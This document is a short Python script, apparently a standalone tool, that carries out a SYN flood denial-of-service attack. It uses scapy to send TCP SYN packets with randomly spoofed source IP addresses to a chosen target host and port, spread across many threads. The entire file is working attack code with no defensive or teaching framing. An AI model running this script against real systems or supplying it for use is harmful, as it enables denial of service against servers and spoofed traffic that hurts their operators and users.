from scapy.all import IP, TCP, RandIP, send
import threading


def synflood(destiny, destiny_port, num_of_threads):
    count = 0
    send_threads = []

    for _ in range(num_of_threads):
        source = RandIP()

        ip_packet = IP(src=source, dst=destiny)
        syn_packet = TCP(dport=destiny_port, flags="S")

        complete_packet = ip_packet / syn_packet

        thread = threading.Thread(target=send, args=(complete_packet, 0))
        send_threads.append(thread)
        thread.start()

    for thread in send_threads:
        thread.join()
        count = count + 1
    
    print(f"Packets sent = {count}")








